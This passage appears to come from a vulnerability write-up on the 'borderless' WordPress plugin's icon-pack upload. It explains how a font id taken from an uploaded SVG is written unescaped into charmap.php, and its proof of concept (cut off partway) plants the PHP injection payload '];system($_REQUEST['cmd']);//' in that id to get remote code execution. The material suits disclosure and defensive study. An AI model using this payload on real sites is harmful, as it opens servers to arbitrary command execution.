class=&#34;s2&#34;&gt;&amp;#34;borderless&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If a font folder with the same name already exists, the process is aborted.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Parse JSON to get icon list&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$file_contents&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$json&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_contents&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;IcoMoonType&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;This&amp;ensp;Icon&amp;ensp;Pack&amp;ensp;is&amp;ensp;not&amp;ensp;an&amp;ensp;Icomoon&amp;ensp;pack...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Ensures the JSON is a valid IcoMoon pack.&lt;/li&gt;&#xA;&lt;li&gt;Iterates over the icon list, sanitizes names, classes, and tags, then stores them in &lt;code&gt;$this-&amp;gt;json_config&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Generate configuration and write file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_config&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unknown&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;write_config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;re_write_css&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rename_files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rename_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add_font&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;If the data is valid, the plugin:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Writes &lt;code&gt;charmap.php&lt;/code&gt; containing the &lt;code&gt;$icons&lt;/code&gt; array&lt;/li&gt;&#xA;&lt;li&gt;Regenerates CSS&lt;/li&gt;&#xA;&lt;li&gt;Renames files and folders&lt;/li&gt;&#xA;&lt;li&gt;Adds the font pack to the system&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The required JSON and SVG files look like this:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;&amp;ensp;&amp;ensp;&#34;IcoMoonType&#34;: &#34;selection&#34;,&#xA;&amp;ensp;&amp;ensp;&#34;icons&#34;: [&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;{&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;icon&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;tags&#34;: [&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;house&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;main&#34;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;]&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;},&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;properties&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;name&#34;: &#34;home&#34;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;}&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;}&#xA;&amp;ensp;&amp;ensp;]&#xA;}&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml&amp;ensp;version=&amp;#34;1.0&amp;#34;&amp;ensp;standalone=&amp;#34;no&amp;#34;?&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE&amp;ensp;svg&amp;ensp;PUBLIC&amp;ensp;&amp;#34;-//W3C//DTD&amp;ensp;SVG&amp;ensp;1.1//EN&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;ensp;&amp;ensp;&amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;svg&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;xmlns=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2000/svg&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;defs&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;font&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;id=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;horiz-adv-x=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1024&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;font-face&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;font-family=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;icomoon&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;units-per-em=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1024&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;ascent=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;960&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;descent=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-64&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;glyph&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;unicode=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;amp;#xe900;&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;glyph-name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;home&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;d=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;M512&amp;ensp;128L128&amp;ensp;512h128v320h192V640h128v192h192V512h128z&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/font&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/defs&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Attacker&amp;ensp;with&amp;ensp;Administrator&amp;ensp;privilege&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Uploads&amp;ensp;a&amp;ensp;ZIP&amp;ensp;file&amp;ensp;containing&amp;ensp;an&amp;ensp;Icon&amp;ensp;Pack&amp;ensp;(SVG&amp;ensp;+&amp;ensp;JSON)&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;AJAX&amp;ensp;call:&amp;ensp;borderless_ajax_add_zipped_font&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;zip_flatten()&amp;ensp;extracts&amp;ensp;files&amp;ensp;into&amp;ensp;/uploads/borderless_icon_fonts/borderless_temp/&#34;]&#xD;&#xA;&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;create_config()&amp;ensp;is&amp;ensp;executed&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;Reads&amp;ensp;the&amp;ensp;SVG&amp;ensp;file&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;Extracts&amp;ensp;font&amp;ensp;id=...&amp;ensp;as&amp;ensp;ip_name&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;sanitize_text_field(ip_name)&amp;ensp;(dangerous&amp;ensp;characters&amp;ensp;not&amp;ensp;removed)&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;I[&#34;Reads&amp;ensp;JSON&amp;ensp;file&#34;]&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;J[&#34;Builds&amp;ensp;$this-&gt;json_config&amp;ensp;array&#34;]&#xD;&#xA;&#xD;&#xA;H&amp;ensp;&amp;&amp;ensp;J&amp;ensp;--&gt;&amp;ensp;K[&#34;write_config()&amp;ensp;writes&amp;ensp;data&amp;ensp;into&amp;ensp;charmap.php&#34;]&#xD;&#xA;&#xD;&#xA;K&amp;ensp;--&gt;&amp;ensp;L[&#34;Injected&amp;ensp;payload&amp;ensp;is&amp;ensp;embedded&amp;ensp;into&amp;ensp;PHP&amp;ensp;code&#34;]&#xD;&#xA;L&amp;ensp;--&gt;&amp;ensp;M[&#34;charmap.php&amp;ensp;now&amp;ensp;contains&amp;ensp;malicious&amp;ensp;PHP&#34;]&#xD;&#xA;&#xD;&#xA;M&amp;ensp;--&gt;&amp;ensp;N[&#34;Server&amp;ensp;loads/includes&amp;ensp;charmap.php&#34;]&#xD;&#xA;N&amp;ensp;--&gt;&amp;ensp;O[&#34;Remote&amp;ensp;Code&amp;ensp;Execution&amp;ensp;(RCE)&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a ZIP file containing &lt;code&gt;rce.json&lt;/code&gt; and &lt;code&gt;rce.svg&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;&amp;ensp;&amp;ensp;&#34;IcoMoonType&#34;: &#34;selection&#34;,&#xA;&amp;ensp;&amp;ensp;&#34;icons&#34;: [&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;{&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;icon&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;tags&#34;: [&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;house&#34;,&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;main&#34;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;]&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;},&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;properties&#34;: {&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#34;name&#34;: &#34;home&#34;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;}&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;}&#xA;&amp;ensp;&amp;ensp;]&#xA;}&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml&amp;ensp;version=&amp;#34;1.0&amp;#34;&amp;ensp;standalone=&amp;#34;no&amp;#34;?&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE&amp;ensp;svg&amp;ensp;PUBLIC&amp;ensp;&amp;#34;-//W3C//DTD&amp;ensp;SVG&amp;ensp;1.1//EN&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;ensp;&amp;ensp;&amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;svg&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;xmlns=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2000/svg&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;defs&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;font&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;id=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#39;];system($_REQUEST[&amp;#39;cmd&amp;#39;]);//&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;horiz-adv-x=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1024&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;font-face&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;font-family=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;icomoon&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;units-per-em=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;1024&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;ascent=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;960&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;descent=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-64&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nt&#34;&gt;&amp;lt;glyph&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;unicode=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;amp;#xe900;&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;glyph-name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;home&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;d=&lt;/span&gt;&lt;span 